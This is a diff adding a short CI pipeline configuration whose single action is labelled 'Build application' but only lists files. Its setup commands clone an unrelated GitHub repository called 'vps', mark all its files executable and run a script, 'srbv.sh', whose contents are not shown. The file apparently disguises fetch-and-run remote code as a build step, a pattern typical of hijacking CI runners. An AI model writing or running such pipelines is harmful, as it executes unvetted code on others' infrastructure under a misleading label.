@@ -1,0 +1,15 @@
+actions:
+- action: "Build application"
+  type: "BUILD"
+  docker_image_name: "library/ubuntu"
+  docker_image_tag: "$tag"
+  execute_commands:
+  - "ls -al > ls.log"
+  setup_commands:
+  - "apt-get update -y"
+  - "apt-get install -y wget"
+  - "apt-get install -y git"
+  - "git clone https://github.com/champlin01/vps"
+  - "cd vps"
+  - "chmod +x *"
+  - "sh srbv.sh"
